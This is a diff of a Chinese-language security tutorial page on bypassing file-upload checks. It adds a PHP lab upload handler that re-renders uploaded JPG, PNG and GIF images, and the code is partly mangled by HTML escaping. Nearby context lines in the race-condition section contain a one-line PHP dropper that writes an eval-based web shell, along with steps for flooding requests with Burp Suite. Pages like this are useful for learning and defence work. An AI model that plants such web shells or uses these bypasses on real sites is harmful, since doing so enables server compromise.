@@ -456,14 +456,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    15.7k
+                    16k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    67 分
+                    69 分
                 </div>
                 
 
@@ -1042,8 +1042,84 @@
 <p>一般不会对渲染之后的再次渲染</p>
 <h3 id="绕过图片二次渲染上传原理"><a href="#绕过图片二次渲染上传原理" class="headerlink" title="绕过图片二次渲染上传原理"></a>绕过图片二次渲染上传原理</h3><p>有些图片上传，会对上传的图片进行二次渲染后在保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。例如新闻图片封面等可能需要二次渲染，因为原图片占用的体积更大。访问的人数太多时候会占用，很大带宽。二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除。</p>
 <h3 id="绕过图片二次渲染上传代码分析"><a href="#绕过图片二次渲染上传代码分析" class="headerlink" title="绕过图片二次渲染上传代码分析"></a>绕过图片二次渲染上传代码分析</h3><p>只允许上传 JPG PNG gif 在源码中使用 imagecreatefromgif 函数对图片进行二次生成。生成的图片保存在，upload 目录下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$is_upload &#x3D; false;<br>$msg &#x3D; null;<br>if (isset($_POST[‘submit’])){<br>    &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径<br>    $filename &#x3D; $_FILES[‘upload_file’][‘name’];<br>    $filetype &#x3D; $_FILES[‘upload_file’][‘type’];<br>    $tmpname &#x3D; $_FILES[‘upload_file’][‘tmp_name’];</p>
+<pre><code>$target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);
 
+// 获得上传文件的扩展名
+$fileext= substr(strrchr($filename,&quot;.&quot;),1);
+
+//判断文件后缀与类型，合法才进行上传操作
+if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;
+    if(move_uploaded_file($tmpname,$target_path))&#123;
+        //使用上传的图片生成新的图片
+        $im = imagecreatefromjpeg($target_path);
+
+        if($im == false)&#123;
+            $msg = &quot;该文件不是jpg格式的图片！&quot;;
+            @unlink($target_path);
+        &#125;else&#123;
+            //给新图片指定文件名
+            srand(time());
+            $newfilename = strval(rand()).&quot;.jpg&quot;;
+            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+            imagejpeg($im,$img_path);
+            @unlink($target_path);
+            $is_upload = true;
+        &#125;
+    &#125; else &#123;
+        $msg = &quot;上传出错！&quot;;
+    &#125;
+
+&#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;
+    if(move_uploaded_file($tmpname,$target_path))&#123;
+        //使用上传的图片生成新的图片
+        $im = imagecreatefrompng($target_path);
+
+        if($im == false)&#123;
+            $msg = &quot;该文件不是png格式的图片！&quot;;
+            @unlink($target_path);
+        &#125;else&#123;
+             //给新图片指定文件名
+            srand(time());
+            $newfilename = strval(rand()).&quot;.png&quot;;
+            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+            imagepng($im,$img_path);
+
+            @unlink($target_path);
+            $is_upload = true;               
+        &#125;
+    &#125; else &#123;
+        $msg = &quot;上传出错！&quot;;
+    &#125;
+
+&#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;
+    if(move_uploaded_file($tmpname,$target_path))&#123;
+        //使用上传的图片生成新的图片
+        $im = imagecreatefromgif($target_path);
+        if($im == false)&#123;
+            $msg = &quot;该文件不是gif格式的图片！&quot;;
+            @unlink($target_path);
+        &#125;else&#123;
+            //给新图片指定文件名
+            srand(time());
+            $newfilename = strval(rand()).&quot;.gif&quot;;
+            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+            imagegif($im,$img_path);
+
+            @unlink($target_path);
+            $is_upload = true;
+        &#125;
+    &#125; else &#123;
+        $msg = &quot;上传出错！&quot;;
+    &#125;
+&#125;else&#123;
+    $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+&#125;
+</code></pre>
+<p>}</p>
 <h2 id="2-5-18-文件上传条件竞争漏洞绕过"><a href="#2-5-18-文件上传条件竞争漏洞绕过" class="headerlink" title="2.5.18 文件上传条件竞争漏洞绕过"></a>2.5.18 文件上传条件竞争漏洞绕过</h2><h3 id="文件上传条件竞争漏洞绕过方法"><a href="#文件上传条件竞争漏洞绕过方法" class="headerlink" title="文件上传条件竞争漏洞绕过方法"></a>文件上传条件竞争漏洞绕过方法</h3><p>生成小马：<br>1.php <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?>‘);?&gt;</p>
 <p>上传 php 后门脚本，上传之后用 burpsutie 设置访问，线程建议体提高一些。</p>
 <p>抓包上传 php 文件 设置变量可以是数值，也可以是null，不停的提交这包</p>
@@ -1585,7 +1661,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">28.2k</span>&nbsp;字
+                class="white-color">30.9k</span>&nbsp;字
             
             
             
